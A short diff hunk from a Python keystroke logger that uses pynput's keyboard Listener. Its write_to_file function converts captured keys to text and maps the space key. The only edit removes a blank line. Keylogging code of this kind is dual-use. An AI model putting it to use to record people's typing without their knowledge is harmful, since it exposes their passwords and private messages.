@@ -4,7 +4,6 @@ from pynput.keyboard import Listener
 def write_to_file(key):
     letter = str(key)  # Convert the key object to a string
     letter = letter.replace("'", "")  # Remove single quotes around character keys
-
     # Handling special keys and replacing them with appropriate values
     if letter == 'Key.space':  # Replace space key with an actual space
         letter = ' '
